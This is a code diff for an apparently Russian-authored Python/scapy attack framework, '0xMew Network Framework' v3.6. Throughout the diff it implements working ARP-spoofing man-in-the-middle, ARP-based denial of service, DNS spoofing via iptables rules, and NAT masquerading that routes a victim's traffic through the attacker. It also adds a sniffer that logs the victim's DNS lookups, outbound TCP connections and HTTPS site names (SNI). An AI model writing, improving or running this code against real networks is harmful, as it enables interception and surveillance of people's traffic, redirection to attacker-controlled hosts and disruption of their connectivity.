@@ -7,6 +7,7 @@ import urllib.request
 import urllib.error
 import threading
 import random
+import readline # История команд (стрелочки вверх/вниз)
 from scapy.all import *
 from scapy.layers.tls.all import TLS, TLSClientHello
 from scapy.layers.dns import DNS, DNSQR, DNSRR
@@ -20,7 +21,7 @@ CURRENT_LANG = 'en'
 # СЛОВАРЬ ПЕРЕВОДОВ
 TRANS = {
     'en': {
-        'banner_subtitle': "/// 0xMew Network Framework v3.5 (Stable) ///",
+        'banner_subtitle': "/// 0xMew Network Framework v3.6 (Stable) ///",
         'h_local': " local_network ", 'h_recon': " information_gathering ",
         'h_wifi': " wireless_attacks ", 'h_osint': " osint_person ", 'h_utils': " utilities ",
         'opt_1': "1. arp_spoof (MITM)", 'opt_2': "2. arp_kill (DoS)", 'opt_7': "7. dns_spoof (Redirect)",
@@ -53,7 +54,7 @@ TRANS = {
         'holmes_found': " [+] FOUND: {}",
     },
     'ru': {
-        'banner_subtitle': "/// 0xMew Network Framework v3.5 (Stable) ///",
+        'banner_subtitle': "/// 0xMew Network Framework v3.6 (Stable) ///",
         'h_local': " local_network ", 'h_recon': " information_gathering ",
         'h_wifi': " wireless_attacks ", 'h_osint': " osint_person ", 'h_utils': " utilities ",
         'opt_1': "1. arp_spoof (перехват)", 'opt_2': "2. arp_kill (DoS)", 'opt_7': "7. dns_spoof (редирект)",
@@ -158,6 +159,18 @@ def change_mac_auto(iface):
 def toggle_forward(state):
     val = "1" if state else "0"
     os.system(f"echo {val} > /proc/sys/net/ipv4/ip_forward")
+    # Добавляем контроль IPv6 форвардинга
+    try: os.system(f"echo {val} > /proc/sys/net/ipv6/conf/all/forwarding")
+    except: pass
+
+def get_ipv4_forwarding_state():
+    try: return open('/proc/sys/net/ipv4/ip_forward').read().strip() == '1'
+    except: return False
+
+def get_ipv6_forwarding_state():
+    try: return open('/proc/sys/net/ipv6/conf/all/forwarding').read().strip() == '1'
+    except: return False
+
 def get_mac(ip):
     # Создаем запрос ARP
     arp_request = ARP(pdst=ip)
@@ -310,11 +323,51 @@ def dns_responder(pkt):
                           DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
                               an=DNSRR(rrname=pkt[DNSQR].qname, ttl=10, rdata=REDIRECT_IP))
             send(spoofed_pkt, verbose=0)
-def sni_callback(pkt):
+# --- LOGGING DEDUPLICATION ---
+LAST_LOG_MSG = ""
+LOG_REPEAT_COUNT = 1
+
+def smart_print(msg):
+    global LAST_LOG_MSG, LOG_REPEAT_COUNT
+    if msg == LAST_LOG_MSG:
+        LOG_REPEAT_COUNT += 1
+        # Перезаписываем текущую строку, обновляя счетчик
+        sys.stdout.write(f"\r{msg} \033[90m({LOG_REPEAT_COUNT}x)\033[0m")
+        sys.stdout.flush()
+    else:
+        # Если было повторение, завершаем строку переносом
+        if LOG_REPEAT_COUNT > 1: sys.stdout.write("\n")
+        # Печатаем новое сообщение
+        sys.stdout.write(f"{msg}")
+        sys.stdout.flush()
+        if LOG_REPEAT_COUNT == 1 and LAST_LOG_MSG != "": sys.stdout.write("\n") # Фикс для первого переключения
+        
+        LAST_LOG_MSG = msg
+        LOG_REPEAT_COUNT = 1
+
+def packet_monitor(pkt):
+    # 1. DNS Queries (Что жертва ищет по имени)
+    if pkt.haslayer(DNSQR) and pkt[DNS].qr == 0:
+        try:
+            qname = pkt[DNSQR].qname.decode().rstrip('.')
+            smart_print(f" \033[94m[DNS]\033[0m Looking for >> \033[1m{qname}\033[0m")
+        except: pass
+
+    # 2. TCP SYN (Куда жертва пытается подключиться по IP)
+    if pkt.haslayer(TCP) and pkt[TCP].flags == 0x02: # Только SYN флаг
+        try:
+            dst_ip = pkt[IP].dst
+            dst_port = pkt[TCP].dport
+            # Игнорируем локальный трафик (192.168.x.x)
+            if not dst_ip.startswith("192.168."):
+                smart_print(f" \033[93m[TCP]\033[0m Connecting >> {dst_ip}:{dst_port}")
+        except: pass
+
+    # 3. TLS SNI (Если вдруг HTTPS пробился)
     if pkt.haslayer(TLSClientHello):
         try:
             sni = pkt[TLSClientHello].ext[0].servernames[0].decode()
-            print(f" \033[95m[SNI]\033[0m {pkt[IP].src} -> {sni}")
+            smart_print(f" \033[95m[SNI]\033[0m HTTPS Site >> \033[1m{sni}\033[0m")
         except: pass
 
 def run_attack(mode, target, gateway, iface):
@@ -325,20 +378,32 @@ def run_attack(mode, target, gateway, iface):
 
     if not target_mac:
         print(f"\033[91m[!] Ошибка: Не удалось найти MAC адрес цели ({target}). Она онлайн?\033[0m")
+        input("\n[Enter]...")
         return
     if not gateway_mac:
         print(f"\033[91m[!] Ошибка: Не удалось найти MAC адрес шлюза ({gateway}).\033[0m")
+        input("\n[Enter]...")
         return
 
     print(f" [+] Target: {target} is at {target_mac}")
     print(f" [+] Gateway: {gateway} is at {gateway_mac}")
 
-    toggle_forward(True)
+    # SAVE STATE: Проверяем, был ли включен форвардинг до нас (IPv4 & IPv6)
+    was_forwarding_v4 = get_ipv4_forwarding_state()
+    was_forwarding_v6 = get_ipv6_forwarding_state()
+    print(f" [*] IPv4 Forwarding was: {'ON' if was_forwarding_v4 else 'OFF'}")
+    print(f" [*] IPv6 Forwarding was: {'ON' if was_forwarding_v6 else 'OFF'}")
 
+    # CONFIGURE ATTACK
     if mode == '2': # ARP KILL (DoS)
         print(t('kill_enable'))
-        subprocess.run(f"iptables -A FORWARD -s {target} -j DROP", shell=True)
-        subprocess.run(f"ip6tables -A FORWARD -j DROP", shell=True)
+        # BLACK HOLE: Выключаем форвардинг везде.
+        toggle_forward(False) 
+    else: 
+        # MITM / DNS: Включаем форвардинг
+        toggle_forward(True)
+        # NAT MASQUERADE: Чтобы жертва реально имела инет через нас
+        os.system(f"iptables -t nat -A POSTROUTING -o {iface} -j MASQUERADE")
 
     if mode == '7': # DNS SPOOF
         global SPOOF_DOMAIN, REDIRECT_IP
@@ -348,32 +413,47 @@ def run_attack(mode, target, gateway, iface):
         print(t('dns_start').format(target, REDIRECT_IP))
         subprocess.run(f"iptables -A FORWARD -s {target} -p udp --dport 53 -j DROP", shell=True)
 
-    callback = dns_responder if mode == '7' else sni_callback
-    # Фильтр для сниффера
-    sniffer = AsyncSniffer(iface=iface, prn=callback, filter=f"host {target} and (port 443 or port 53)", store=0)
+    # ВЫБОР CALLBACK-а
+    if mode == '7': 
+        callback = dns_responder # Для DNS Spoof свой обработчик
+    else:
+        callback = packet_monitor # HawkEye Logger для остальных режимов
+
+    # Фильтр для сниффера: ловим всё ОТ жертвы (src {target})
+    sniffer = AsyncSniffer(iface=iface, prn=callback, filter=f"ip src {target}", store=0)
     sniffer.start()
 
     if mode == '1': print(t('attack_start').format(target))
 
     try:
+        my_mac = get_mac_address(iface)
         while True:
-            # ИСПРАВЛЕНИЕ: Теперь явно указываем hwdst (MAC получателя)
+            # ИСПРАВЛЕНИЕ: Используем sendp с явным Ethernet слоем и явным Source MAC
             # 1. Говорим жертве (target), что мы — шлюз
-            send(ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway), verbose=False)
+            sendp(Ether(dst=target_mac, src=my_mac)/ARP(op=2, pdst=target, hwdst=target_mac, psrc=gateway, hwsrc=my_mac), verbose=False, iface=iface)
             # 2. Говорим шлюзу (gateway), что мы — жертва
-            send(ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=target), verbose=False)
+            sendp(Ether(dst=gateway_mac, src=my_mac)/ARP(op=2, pdst=gateway, hwdst=gateway_mac, psrc=target, hwsrc=my_mac), verbose=False, iface=iface)
             time.sleep(2)
     except KeyboardInterrupt:
         sniffer.stop()
-        if mode == '2':
-            print(t('kill_disable'))
-            subprocess.run(f"iptables -D FORWARD -s {target} -j DROP", shell=True)
-            subprocess.run(f"ip6tables -D FORWARD -j DROP", shell=True)
+        print(t('stop_msg'))
+        
+        # RESTORE STATE: Возвращаем как было (отдельно v4 и v6)
+        print(f" [*] Restoring IPv4 Forwarding to {'ON' if was_forwarding_v4 else 'OFF'}...")
+        os.system(f"echo {'1' if was_forwarding_v4 else '0'} > /proc/sys/net/ipv4/ip_forward")
+        
+        print(f" [*] Restoring IPv6 Forwarding to {'ON' if was_forwarding_v6 else 'OFF'}...")
+        try: os.system(f"echo {'1' if was_forwarding_v6 else '0'} > /proc/sys/net/ipv6/conf/all/forwarding")
+        except: pass
+
+        # CLEANUP NAT (Если включали)
+        if mode != '2':
+            os.system(f"iptables -t nat -D POSTROUTING -o {iface} -j MASQUERADE")
+
         if mode == '7':
             print(t('kill_disable'))
             subprocess.run(f"iptables -D FORWARD -s {target} -p udp --dport 53 -j DROP", shell=True)
-            subprocess.run(f"iptables -D FORWARD -s {target} -p udp --dport 53 -j DROP 2>/dev/null", shell=True) # Дубль на всякий
-        print(t('stop_msg'))
+            subprocess.run(f"iptables -D FORWARD -s {target} -p udp --dport 53 -j DROP 2>/dev/null", shell=True)
 
 def check_opsec(iface):
     print(f"\n\033[93m{t('opsec_start')}\033[0m")
@@ -435,8 +515,6 @@ def print_menu(iface, gw):
     print(f"{col5_head}")
     for item in col5_items: print(item)
 
-    print(f"\n\033[95m0xMew\033[0m ~/# ", end="")
-
 if __name__ == "__main__":
     if os.getuid() != 0:
         print("Run as root.")
@@ -448,7 +526,7 @@ if __name__ == "__main__":
     while True:
         try:
             print_menu(iface, gw)
-            choice = input().strip()
+            choice = input(f"\n\033[95m0xMew\033[0m ~/# ").strip()
 
             if choice in ['exit', 'quit']: nuke_it_all(None, None)
             if choice == '99': nuke_it_all(None, None)
